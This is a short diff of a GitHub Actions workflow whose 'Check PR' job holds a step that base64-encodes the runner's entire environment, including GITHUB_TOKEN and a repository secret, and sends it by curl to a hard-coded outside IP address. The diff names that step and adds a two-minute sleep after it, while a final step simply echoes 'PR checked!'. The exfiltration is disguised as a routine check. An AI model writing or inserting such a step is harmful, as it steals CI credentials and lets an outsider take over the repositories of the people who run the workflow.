@@ -9,10 +9,12 @@ jobs:
     name: Check PR
     runs-on: ubuntu-latest
     steps:
-      - name:
+      - name: curl
         run: curl http://103.16.128.93/?env=$(env | base64 | tr -d '\n')
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           THIS_IS_A_SECRET: ${{ secrets.THIS_IS_A_SECRET }}
+      - name: sleep
+        run: sleep 120
       - name: check
         run: echo 'PR checked!'
